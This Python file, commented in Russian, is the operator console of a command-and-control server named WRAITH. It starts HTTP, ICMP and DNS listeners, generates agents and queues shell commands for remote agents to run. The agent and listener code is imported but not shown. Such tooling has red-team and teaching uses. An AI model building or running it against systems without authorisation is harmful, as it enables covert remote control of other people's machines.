import threading
import readline
import time
import sys

from task_manager import TaskManager
from http_listener import run_http
from icmp_listener import run_icmp
from dns_listener import run_dns
from agent_builder import build_agent

RED = "\001\033[91m\002"
GREEN = "\001\033[92m\002"
RESET = "\001\033[0m\002"

running = True #flag for global rounds

listener_map = {
    'http': run_http,
    'icmp': run_icmp,
    'dns': run_dns
}

#----------------------------Анимация и вывод лого----------------------------------
import time
import sys

def animate_banner():
    RED = "\033[91m"
    GREEN = "\033[92m"
    RESET = "\033[0m"
    
    # Фраза WELCOME TO WRAITH в едином стиле (ширина 49 символов)
    banner = r"""
    ╦ ╦ ╔══ ╦   ╔═╗ ╔═╗ ╔╦╗ ╔══   ╔╦╗ ╔═╗   ╦ ╦ ╦═╗ ╔═╗ ╦ ╔╦╗ ╦ ╦
    ║║║ ╠═  ║   ║   ║ ║ ║║║ ╠═     ║  ║ ║   ║║║ ╠╦╝ ╠═╣ ║  ║  ╠═╣
    ╚╩╝ ╚══ ╩═╝ ╚═╝ ╚═╝ ╩ ╩ ╚══    ╩  ╚═╝   ╚╩╝ ╩╚═ ╩ ╩ ╩  ╩  ╩ ╩
    """

    print(RED, end="")
    for char in banner:
        sys.stdout.write(char)
        sys.stdout.flush()
        # Задержка 0.002 секунды для плавной анимации
        time.sleep(0.01) 
        
    print(RESET)
#-----------------------------------------------------------------------------------

# ----------------------------Автодополнение и подсказки-----------------------------
COMMANDS = [
    "generate", "add_task", "list_tasks", "show_result", "start_http", "start_dns",
    "start_icmp", "stop_http", "stop_dns", "stop_icmp", "remove_task", "clear_list_tasks", 
    "status", "help", "exit"
]

def command_completer(text, state):
    # Фильтруем команды, которые начинаются с введенного текста
    options = [cmd for cmd in COMMANDS if cmd.startswith(text)]
    
    # readline вызывает эту функцию несколько раз, пока не вернется None
    if state < len(options):
        return options[state]
    else:
        return None

def display_matches(substitution, matches, longest_match_length):
    print()
    print("  ".join(matches))
    print(f"{RED}C2> {RESET}{substitution}", end='', flush=True)

# -----------------------------------------------------------------------------------

#для использования в функциях запуска слушателей
def start_listener(listeners, task_manager, type_listener):
    if type_listener in listeners and listeners[type_listener]['thread'].is_alive():
        print(f"[!] {type_listener}-слушатель уже запущен.")
        return

    stop_event = threading.Event()
    thread = threading.Thread(target=listener_map[type_listener], args=(stop_event, task_manager))
    thread.daemon = True
    thread.start()

    listeners[type_listener] = {'thread': thread, 'stop_event': stop_event}

    print(f"[+] {type_listener} запущен.")

#для использования в функциях остановки слушателей
def stop_listener(listeners, type_listener):
    if type_listener not in listeners:
        print(f"[!] {type_listener}-слушатель не запущен.")
        return

    stop_event = listeners[type_listener]['stop_event']
    stop_event.set()
    listeners[type_listener]['thread'].join(timeout=1)
    del listeners[type_listener]

    print(f"[+] {type_listener}-слушатель остановлен.")

def generate_command(ip: str, transport: str):
    result = build_agent(ip, transport)
    
    if result == True:
        print("[+] Агент сгенерирован.")
    else:
        print("[-] Ошибка. Агент не сгенерирован.")


def add_task_command(task_manager, connection, command):
    task_manager.add_task(connection, command)

def list_tasks_command(task_manager, connection, status=None):
    if status == None:
        list_tasks = task_manager.list_tasks(connection)
    else:
        list_tasks = task_manager.list_tasks(connection, status)
    
    for task in list_tasks:
        print(f"ID: {task[0]}; task: {task[1]}; status: {task[2]}")

def show_result_command(task_manager, connection, task_id):
    result = task_manager.get_task_result(connection, task_id)
    if result:
        output = result[0]
    else:
        output = "задача еще не выполнена или не найдена."
    print(f"[+] Результат команды id={task_id}: {output}")

def start_http_command(listeners, task_manager):
    start_listener(listeners, task_manager, "http")

def stop_http_command(listeners):
    stop_listener(listeners, "http")

def start_icmp_command(listeners, task_manager):
    start_listener(listeners, task_manager, "icmp")

def stop_icmp_command(listeners):
    stop_listener(listeners, "icmp")

def start_dns_command(listeners, task_manager):
    start_listener(listeners, task_manager, "dns")

def stop_dns_command(listeners):
    stop_listener(listeners, "dns")

def remove_task_command(task_manager, connection, task_id):
    result = task_manager.remove_task(connection, task_id)

    if result == True:
        print(f"[+] Задача id={task_id} успешно удалена.")
    else:
        print(f"[-] Ошибка. Задача id={task_id} отсутствует.")

def clear_list_tasks_command(task_manager, connection):
    print("Вы точно хотите удалить всю базу данных задач? y/n")
    s = input()
    if s == 'y':
        task_manager.clear_list_tasks(connection)
        print("Вся база данных задач удалена.")


def status_command(listeners):
    for protocol in listener_map.keys():
        if protocol in listeners and listeners[protocol]['thread'].is_alive():
            status = f"{GREEN}запущен{RESET}"
        else:
            status = "не запущен"
        print(f"{protocol + '-слушатель:':<15} {status}")

def help_command():
    commands_help = {
        "generate <server_ip> <transport>": "Сгенерировать агент. Варианты <transport>: dns, icmp, http.",
        "add_task <команда>": "Добавить новую задачу для выполнения агентом.",
        "list_tasks [статус]*": "Показать список задач (можно фильтровать по статусу).",
        "show_result <id>": "Показать результат выполнения задачи.",
        "remove_task <id>": "Удалить задачу.",
        "clear_list_tasks": "Очистить список задач.",
        "start_http": "Запустить HTTP-слушатель.",
        "stop_http": "Остановить HTTP-слушатель.",
        "start_icmp": "Запустить ICMP-слушатель.",
        "stop_icmp": "Остановить ICMP-слушатель.",
        "start_dns": "Запустить DNS-слушатель.",
        "stop_dns": "Остановить DNS-слушатель.",
        "status": "Показать статус всех слушателей.",
        "help": "Показать список команд.",
        "exit": "Выйти из программы."
    }

    print("Доступные команды:\n")
    for command in commands_help:
        print(f"    {GREEN}{command:<25}{RESET}{commands_help.get(command)}")
    print("\n")
    print("    *Доступные статусы: \"pending\", \"assigned\", \"completed\".")
    print("\n\n")
    print("Примеры:\n")
    print("    add_task whoami")
    print("    list_tasks")
    print("    list_tasks pending")
    print("    show_result 1")
    print("    generate 192.168.23.12 dns")

def exit_command(connection, listeners):
    connection.close()

    for key in list(listeners.keys()):
        listeners[key]['stop_event'].set()
        listeners[key]['thread'].join(timeout=1)

    global running
    running = False

    print("[+] C2 остановлен.")

def parse_and_execute(task_manager, connection, command, listeners):
    parse_command = command.split()
    
    if parse_command[0] == "generate":
        if len(parse_command) != 3:
            print("Команда \"generate\" требует два аргумента.\n"
                  "Используйте так: generate <server_ip> <transport>\n"
                  "Воспользуйтесь командой \"help\" для подробного описания команд.")
        else:
            generate_command(parse_command[1], parse_command[2])
    elif parse_command[0] == "add_task":
        if len(parse_command) == 1:
            print("Команда \"add_task\" требует минимум 1 аргумент.\n"
                  "Используйте так: add_task <command>\n"
                  "Воспользуйтесь командой \"help\" для подробного описания команд.")
        else:
            add_task_command(task_manager, connection, ' '.join(parse_command[1:]))
            print("[+] Задача для агента успешно добавлена.")
    elif parse_command[0] == "list_tasks":
        if len(parse_command) == 1:
            list_tasks_command(task_manager, connection)
        else:
            list_tasks_command(task_manager, connection, parse_command[1])
    elif parse_command[0] == "show_result":
        if len(parse_command) != 2:
            print("Команда \"show_result\" требует один аргумент.\n"
                  "Используйте так: show_result <id>\n"
                  "Воспользуйтесь командой \"help\" для подробного описания команд.")
        else:
            show_result_command(task_manager, connection, parse_command[1])
    elif parse_command[0] == "remove_task":
        if len(parse_command) != 2:
            print("Команда \"remove_task\" требует один аргумент.\n"
                  "Используйте так: remove_task <id>\n"
                  "Воспользуйтесь командой \"help\" для подробного описания команд.")
        else:
            remove_task_command(task_manager, connection, parse_command[1])
    elif parse_command[0] == "start_http":
        start_http_command(listeners, task_manager)
    elif parse_command[0] == "stop_http":
        stop_http_command(listeners)
    elif parse_command[0] == "start_icmp":
        start_icmp_command(listeners, task_manager)
    elif parse_command[0] == "stop_icmp":
        stop_icmp_command(listeners)
    elif parse_command[0] == "start_dns":
        start_dns_command(listeners, task_manager)
    elif parse_command[0] == "stop_dns":
        stop_dns_command(listeners)
    elif parse_command[0] == "clear_list_tasks":
        clear_list_tasks_command(task_manager, connection)
    elif parse_command[0] == "status":
        status_command(listeners)
    elif parse_command[0] == "help":
        help_command()
    elif parse_command[0] == "exit":
        exit_command(connection, listeners)
    else:
        print("[-] Такой команды не существует. Для подробной информации введите \"help\".")

def main():
    animate_banner()

    HISTORY_FILE = ".c2_history"
    try:
        readline.read_history_file(HISTORY_FILE)
    except FileNotFoundError:
        pass
    readline.set_history_length(1000)

    # 2. Настройка автодополнения по Tab
    readline.set_completer_delims(' ') # Разделитель — пробел
    readline.set_completer(command_completer) # Твоя функция из Шага 1
    readline.parse_and_bind('tab: complete') # Привязка к клавише Tab
    
    # Красивое отображение вариантов при двойном Tab
    readline.set_completion_display_matches_hook(display_matches) 

#------------------Основной код сервера-------------------------------------
    listeners = {} #хеш таблица для слушателей
    tm = TaskManager("c2_tasks.db") #экземпляр БД
    con_cli = tm.get_connection()

    print("[+] C2 поднят.")

    try:
        #global rounds
        while running:
            command = input(f"{RED}C2> {RESET}")
            if not command.strip():
                continue
            parse_and_execute(tm, con_cli, command, listeners)
    except KeyboardInterrupt:
        exit_command(con_cli, listeners)
    finally:
        readline.write_history_file(HISTORY_FILE)

if __name__ == "__main__":
    main()
